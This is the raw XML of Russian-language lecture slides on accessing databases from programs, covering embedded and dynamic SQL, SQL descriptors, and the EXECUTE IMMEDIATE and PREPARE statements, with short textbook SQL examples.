                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>QL-операторов</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t> (статический SQL).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="857250" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>Встраиваемый SQL-оператор указывается после фразы EXEC SQL, имеет входные переменные.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Формирование</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t> в процессе выполнения программы на некотором языке программирования </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>кода SQL-операторов </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>и дальнейшего их выполнения (динамический SQL).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Вызов</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t> из программ, написанных на других языках программирования, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SQL-модулей</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU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Использование API </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>(Application </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0" err="1"/>
              <a:t>Programming</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t> Interface) - работа с базой данных через предоставляемый набор функций.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7E137B-8042-B4BD-3A42-E33E18A67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668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884F8-F6D3-D31B-7B9F-2D3448F6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  <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t> – дескриптор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1C1230-C049-BC6F-2FD3-8DA077B3B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0768"/>
            <a:ext cx="8136904" cy="446449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accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SQL-дескриптор</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t> - это область, которая временно создается СУБД для хранения информации о параметрах откомпилированного SQL-оператора. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="ru-RU" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>Работа с SQL-дескриптором состоит из следующих этапов:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" dirty="0"/>
              <a:t>Создание SQL-дескриптора оператором ALLOCATE DESCRIPTOR ;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" dirty="0"/>
              <a:t>Задание значений для SQL-дескриптора может выполняться:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-342900"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1200" dirty="0"/>
              <a:t>при выполнении оператора SET DESCRIPTOR ;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-342900"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1200" dirty="0"/>
              <a:t>при выполнении оператора DESCRIBE для автоматической установки значений;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" dirty="0"/>
              <a:t>Использование значений динамических параметров:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-342900"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1200" dirty="0"/>
              <a:t>извлечение значений параметров при выполнении оператора GET DESCRIPTOR ;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-342900"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1200" dirty="0"/>
              <a:t>использование значений параметров при выполнении оператора EXECUTE ;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" dirty="0"/>
              <a:t>Освобождение SQL-дескриптора оператором DEALLOCATE DESCRIPTOR.</a:t>
            </a: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40CEE-6FDB-8E55-F614-31ADC7351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568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3D0B4-3F28-8A6B-E3E6-927AD6E5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 к СУБД из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600F52-2BF3-B9F4-23A8-055A96530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5E6D291-CF6E-7A3A-B9E1-1D8AE3DEAC40}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="395536" y="1484785"/>
            <a:ext cx="1656184" cy="4970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Исходный код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04490BE-7975-259E-6465-6221BA990BB4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3779912" y="1483732"/>
            <a:ext cx="1872208" cy="4970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Перекомпиляция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6AC69A1-88EB-06B1-324F-689DA5DD73CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1809274" y="2564905"/>
            <a:ext cx="1826622" cy="4970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Создание модуля доступа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E8D6B41-99E6-DB5C-0BEC-F28BD6A185F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5436096" y="2564905"/>
            <a:ext cx="1656184" cy="4970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Подстановка подпрограмм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E877056-2D39-795F-132A-452F07FFF716}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3779912" y="3769865"/>
            <a:ext cx="1872208" cy="3231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Компиляция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EA3596B-EC9C-8C83-75C0-98A5640A3A67}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3779913" y="4545466"/>
            <a:ext cx="1872208" cy="3231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Линкование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17EE7D2-A0A2-E29A-B822-6E9D21807B5F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3779913" y="5249150"/>
            <a:ext cx="1872208" cy="3231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Связывание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B3B5DF7-9D6C-7381-391A-936A5158FC4A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6532959" y="4545465"/>
            <a:ext cx="1872208" cy="32314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Выполнимый код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6DE7712-6973-65C6-2FBF-61DFC1BBAF87}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6521352" y="5250388"/>
            <a:ext cx="1872208" cy="32314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План доступа</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p: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BABE564E-A6D5-A54E-8D4A-164796F68B3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051720" y="1732235"/>
            <a:ext cx="1728192" cy="10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32C902AE-2F05-2D8C-F118-1D74A66D401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3469827" y="1318715"/>
            <a:ext cx="584167" cy="19082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7DA8A781-D560-5167-9053-5D89CB746E3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6200000" flipH="1">
            <a:off x="5198019" y="1498735"/>
            <a:ext cx="584167" cy="15481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899DA0DA-92ED-7325-C210-E46740F21EB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6200000" flipH="1">
            <a:off x="3407933" y="2461782"/>
            <a:ext cx="707954" cy="1908212"/>
          </a:xfrm>
          <a:prstGeom prst="bentConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 253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id="{D3042474-D677-3C1D-5D6F-B6FCDF98108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5136125" y="2641802"/>
            <a:ext cx="707954" cy="1548172"/>
          </a:xfrm>
          <a:prstGeom prst="bentConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 255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13CB496E-3E30-577C-9338-F2C9206C762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4716016" y="4093009"/>
            <a:ext cx="1" cy="452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4C2EAD26-585B-34C7-4AFB-1015871AD3B6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4716017" y="4868610"/>
            <a:ext cx="0" cy="38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: уступ 47">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{70C9E336-6F54-3D9E-1CD1-2475E48B642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5652121" y="4707037"/>
            <a:ext cx="880838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0" name="Соединитель: уступ 49">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6ABA0EC4-4EEE-1F74-8446-7AE5A756D648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5652121" y="5410722"/>
            <a:ext cx="869231" cy="12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A2DC9463-F12F-2C55-25DF-0ED086F20EDA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:stCxn id="9" idx="2"/>
            <a:endCxn id="13" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="16200000" flipH="1">
            <a:off x="2119453" y="3750261"/>
            <a:ext cx="2348811" cy="9721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CC81A79-6DB6-244C-0F0A-1E4E3BF4D037}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6444209" y="1638462"/>
            <a:ext cx="179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Обработка кода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1636A8-7824-9122-FF1C-30DCC95E781E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="790197" y="3531149"/>
            <a:ext cx="1707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Формирование </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" i="1" dirty="0"/>
              <a:t>запроса</a:t>
            </a:r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859EDB95-44E8-FD73-8311-A01F73379172}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4924717" y="2622781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6DA741F6-8621-C429-43BA-0F67FBFF2FEB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2282571" y="4236315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53FC703B-7564-1200-FF04-E8916B3EFDDF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3681481" y="2386882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32DEA163-17C0-C150-480B-36E772584523}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5674783" y="4993567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7395B1D5-74A8-0B07-9F95-A5D2DB81B7B6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3681481" y="2789924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D4F40985-5320-643B-111A-70E691E13F0C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4799092" y="3340506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ED38F169-49F3-0C8F-3E8F-F362C0707689}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5674783" y="4266871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DC6E3ABE-90BC-6047-32E0-EA2C67762E89}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6072043" y="4266871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207F6126-00CB-C81A-045B-7BD6F5A27C92}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5213138" y="3329415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FB03CEDB-F552-51D7-0FD7-66379030BD23}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5627184" y="3348441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8F0874AB-3962-B985-1D17-CE447940FC8E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6072043" y="4998643"/>
            <a:ext cx="351884" cy="351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414822-B657-515A-6059-9E1FF97A2F7D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6717413" y="4134571"/>
            <a:ext cx="195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Тип запроса</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2389650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53D69-89A1-747A-9342-2EDAA580D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Динамический </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t> - идеология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5594A2-F84F-FAE5-F7FA-85A71A441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DA960EC-B869-EF5C-C492-65680F28C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38044"/>
            <a:ext cx="7704856" cy="1014411"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>Динамический SQL — это операторы SQL, которые формируются во время выполнения; </a:t>
            </a:r>
          </a:p>
          <a:p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67F326F-56EE-E300-39E8-15D03CD7203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39552" y="2308860"/>
          <a:ext cx="8064896" cy="248412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67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507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Причина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Пример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Реакция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нужен запрос, в котором имя таблицы воспринимается как параметр </a:t>
                      </a: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(чтобы можно было его задавать)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b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="C00000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>DECLARE @</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="C00000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>TableName</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="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rgbClr val="C00000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>VarChar</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="C00000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>(200) </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t/>
                      </a:r>
                      <a:br>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>--объявил переменную</a:t>
                      </a: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b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="C00000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>SET @</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="C00000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>TableName</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="C00000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> = "</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="C00000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Products</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="C00000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>" </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t/>
                      </a:r>
                      <a:br>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>--присвоил ей значение</a:t>
                      </a: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</a:rPr>
                        <a:t>SELECT * FROM @</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="C00000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>TableName</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t/>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>--</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>выдаст ошибку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Синтаксически в поле FROM нельзя подставлять переменную. Чтобы избежать ошибки, надо этот запрос сделать динамическим.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C02D5A-D2FA-6BF4-1881-52CF60CA743A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="5003692"/>
            <a:ext cx="8136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Операторы динамического SQL формируются как текстовые переменные.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7C03E45-E096-6F27-2ECC-BA0F7F369BC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548101" y="5805264"/>
            <a:ext cx="3384377" cy="86409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Компиляция + выполнение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CDD6405-555F-0927-EFDA-C60F5D8E9593}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="535649" y="5373216"/>
            <a:ext cx="3384377" cy="5760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Одношаговый интерфейс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C582BF8-F6A9-7B98-56F2-E867E72BE2AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5236921" y="5805264"/>
            <a:ext cx="3384377" cy="86409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RU" dirty="0"/>
              <a:t>Ш1. Компиляция</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>Ш2. Выполнение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591983F-409F-9620-F73C-E4BE91915880}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5220071" y="5417472"/>
            <a:ext cx="3384377" cy="5760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Многошаговый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4094613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813B9-3ECC-551C-8887-9C762856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Динамический </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t> - Одношаговый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C63129-BB04-51EE-5771-54E235812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808312"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0"/>
              <a:t>Реализуется SQL-оператором </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EXECUTE IMMEDIATE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EXECUTE IMMEDIATE :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>variable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0"/>
              <a:t>На оператор, указываемый переменной (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0" err="1"/>
              <a:t>variable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0"/>
              <a:t>), накладываются следующие ограничения:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>оператор не может использовать INTO-переменные;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="857250" lvl="2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EXEC SQL SELECT f1,f2,f3 FROM tbl1 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="857250" lvl="2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         INTO :var1, var2, var3 WHERE f1=1;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>оператор не может использовать связанные переменные.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57B78F-CA5E-3A73-3816-ACE5CB685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C6A4F3-BBF1-6F5C-8675-64807B32E7D3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1576874" y="4302163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stmt_str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:= 'INSERT INTO ' ||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table_name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||</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU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' values (:f1, :f2, :f3)';</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU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EXEC SQL EXECUTE IMMEDIATE :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stmt_str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14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7433F-3B2C-37A7-6707-FE0F6F1F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Динамический </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t> - Многошаговый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D8A36E-414E-9A2E-D111-AE28F8E2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73764"/>
            <a:ext cx="7992888" cy="4752528"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/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При выполнении оператора PREPARE,  указываемый им SQL-оператор передается в СУБД. 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Выполняется синтаксический разбор и строится план выполнения.  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При каждом следующем выполнении оператора EXECUTE на сервер передаются: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уже "откомпилированный" SQL-оператор. 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600" dirty="0"/>
              <a:t>значения переменных связи (если есть), (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" i="1" dirty="0"/>
              <a:t>в частности, для вычисления WHERE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0"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C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PREPARE [ GLOBAL | LOCAL ] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>operator_sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>string_variable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C0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ru-RU" sz="1600" b="1" dirty="0" err="1"/>
              <a:t>operator_sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>- определяет идентификатор SQL-оператора, указываемый далее для выполнения в операторе EXECUTE или для включения в курсор.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" b="1" dirty="0" err="1"/>
              <a:t>string_variable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>указывает строку, содержащую динамически сформированный текст SQL-оператора.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400" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Динамические параметры можно использовать как во встроенном SQL, так и в динамическом SQL.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4735BA-D6E4-A890-8920-01F6C450D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A56A6E-CC2F-DF7A-7588-A16FE7ED0B84}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1259632" y="5507670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stmt_str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:= 'INSERT INTO ' ||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table_name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||</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU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' values (:f1, :f2, :f3)';</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU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EXEC SQL PREPARE GLOBAL stmt1 FROM :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stmt_str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25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ADC40-2419-B0B6-64BE-348E2F23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Динамический </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t> - выполнение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ECC357-A511-39A4-22CC-1AE41317A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0405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Операторы формируются на этапе выполнения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140B54-41E9-59BE-E8CE-949F1F646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59C42-B4C5-7579-25CC-D51E8426D6BB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
